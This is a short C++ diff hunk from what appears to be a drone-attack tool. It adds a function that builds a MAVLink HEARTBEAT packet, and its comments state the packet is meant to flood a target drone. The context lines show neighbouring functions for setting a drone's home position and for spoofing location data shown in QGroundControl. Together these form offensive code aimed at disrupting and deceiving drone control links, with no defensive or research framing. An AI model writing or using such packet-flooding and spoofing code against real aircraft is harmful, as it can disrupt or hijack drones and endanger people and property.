@@ -310,6 +310,27 @@ std::vector<uint8_t> CreateSetHomePositionPacket(uint8_t target_system, double l
     uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
     return std::vector<uint8_t>(buffer, buffer + len);
 }
+// Create a MAVLink HEARTBEAT message to flood the target drone
+// This function generates a MAVLink HEARTBEAT packet that can be used to flood a target
+std::vector<uint8_t> CreateHeartbeatPacket(uint8_t system_id) {
+    mavlink_message_t msg;
+    uint8_t component_id = 0;  // Typically 0 for autopilot
+
+    mavlink_heartbeat_t heartbeat = {};
+    heartbeat.type = MAV_TYPE_QUADROTOR;
+    heartbeat.autopilot = MAV_AUTOPILOT_ARDUPILOTMEGA;
+    heartbeat.base_mode = 0;
+    heartbeat.custom_mode = 0;
+    heartbeat.system_status = MAV_STATE_ACTIVE;
+
+    mavlink_msg_heartbeat_encode(system_id, component_id, &msg, &heartbeat);
+
+    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
+    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
+    
+    return std::vector<uint8_t>(buffer, buffer + len);
+}
+
 
 // Create a MAVLink GLOBAL_POSITION_INT message for QGroundControl spoofing
 std::vector<uint8_t> CreateQgcLocationSpoofPacket(uint8_t system_id, double lat, double lon, double alt) {
